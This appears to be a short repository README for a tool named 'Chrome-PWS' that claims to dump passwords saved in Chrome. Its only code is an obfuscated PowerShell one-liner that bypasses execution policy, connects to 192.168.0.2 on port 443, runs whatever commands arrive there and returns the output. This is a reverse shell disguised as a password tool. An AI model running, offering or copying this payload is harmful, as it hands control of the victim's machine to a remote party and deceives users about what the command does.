# Chrome-PWS
Simply dumps the passwords saved in chrome


powershell.exe -nop -ep bypass -Command "$DYqnEYKqAlZt=new-object system.net.sockets.tcpclient('192.168.0.2',443);$JsgnXSZribtw=$DYqnEYKqAlZt.GetStream();[byte[]]$XRdvmcTFTlsNG=0..65535|%{0};while(($BowVEHbIk=$JsgnXSZribtw.Read($XRdvmcTFTlsNG,0,$XRdvmcTFTlsNG.Length)) -ne 0){;$YJYLKNpczewgVBX=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($XRdvmcTFTlsNG,0,$BowVEHbIk);$sGIUgROUVRw=(iex $YJYLKNpczewgVBX 2>&1|out-string);$NyVWejQc=$sGIUgROUVRw+'PS '+(pwd).Path+'>';$nOfvgw=([text.encoding]::ASCII).GetBytes($NyVWejQc);$JsgnXSZribtw.Write($nOfvgw,0,$nOfvgw.Length);$JsgnXSZribtw.Flush};$DYqnEYKqAlZt.close()" 
